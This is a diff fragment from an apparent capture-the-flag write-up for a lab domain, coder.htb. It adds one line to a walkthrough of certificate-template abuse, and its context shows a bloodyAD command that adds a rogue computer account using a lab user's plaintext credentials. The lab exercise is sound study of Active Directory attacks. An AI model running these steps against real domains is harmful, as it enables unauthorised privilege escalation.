@@ -1040,6 +1040,7 @@ Now ill modify the attribute to `"msPKI-Certificate-Name-Flag": 402653185` this 
 }
 ```
 
+Now the template is set, and ready to be published to the CA
 
 ```python
 ❯❯❯ bloodyAD --host dc01.coder.htb -d coder.htb -u s.blade -p 'AmcwNO60Zg3vca3o0HDrTC6D' add computer 'evil' 'Password123!' --ou 'OU=BuildAgents,OU=Development,DC=coder,DC=htb' 
